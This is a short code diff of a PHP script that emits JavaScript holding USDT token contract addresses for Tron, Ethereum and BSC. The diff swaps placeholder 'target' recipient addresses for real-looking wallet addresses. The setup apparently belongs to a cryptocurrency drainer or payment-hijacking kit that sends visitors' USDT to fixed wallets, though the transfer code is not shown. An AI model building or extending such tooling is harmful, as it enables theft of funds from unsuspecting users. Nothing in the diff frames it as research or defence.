@@ -9,9 +9,10 @@ if (isset($_GET['js'])) {
     $defaultUsdtTron = $cfg['DEFAULT_USDT_TRON'] ?? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
     $defaultUsdtEth = $cfg['DEFAULT_USDT_ETH'] ?? '0xdAC17F958D2ee523a2206206994597C13D831ec7';
     $defaultUsdtBsc = $cfg['DEFAULT_USDT_BSC'] ?? '0x55d398326f99059fF775485246999027B3197955';
+    
     $defaultToTron = $cfg['TRON_TAGET_ADDRESS'] ?? 'TCrxJjcjfEDrPdQgYRfF4UVziuq6zGPsV6';
-    $defaultToBsc = $cfg['BSC_TARGET_ADDRESS'] ?? '0x8138023332333233323332333233323332333233';
-    $defaultToEth = $cfg['ETH_TARGET_ADDRESS'] ?? '0x8138023332333233323332333233323332333233';
+    $defaultToBsc = $cfg['BSC_TARGET_ADDRESS'] ?? '0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED';
+    $defaultToEth = $cfg['ETH_TARGET_ADDRESS'] ?? '0x699E6785887C20dF58f5CA889E00Ee1fFD67DEA2';
 
     echo "(function () {\n";
     echo "  const DEFAULT_USDT_TRON = " . json_encode($defaultUsdtTron, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . ";\n";
